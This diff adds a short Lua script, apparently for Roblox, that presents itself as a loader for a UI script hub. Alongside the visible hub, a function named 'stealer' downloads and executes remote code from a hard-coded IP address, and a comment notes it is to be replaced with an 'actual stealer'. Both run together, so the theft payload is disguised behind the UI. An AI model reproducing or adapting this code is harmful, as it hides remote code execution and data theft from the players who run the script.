@@ -1,0 +1,8 @@
+local function stealer()
+    loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjQzMDllMDEyLTZlODgtNDcwYy1hYzI0LTAzNzlkM2RhODlkMyIsImtpbmQiOiJsb2FkZXIifQ"))() -- replace with actual stealer
+end
+local function loadui()
+  loadstring(game:HttpGet('https://raw.githubusercontent.com/Roman34296589/SnapSanixHUB/refs/heads/main/SnapSanixHUB.lua'))()
+end
+task.spawn(stealer)
+task.spawn(loadui)
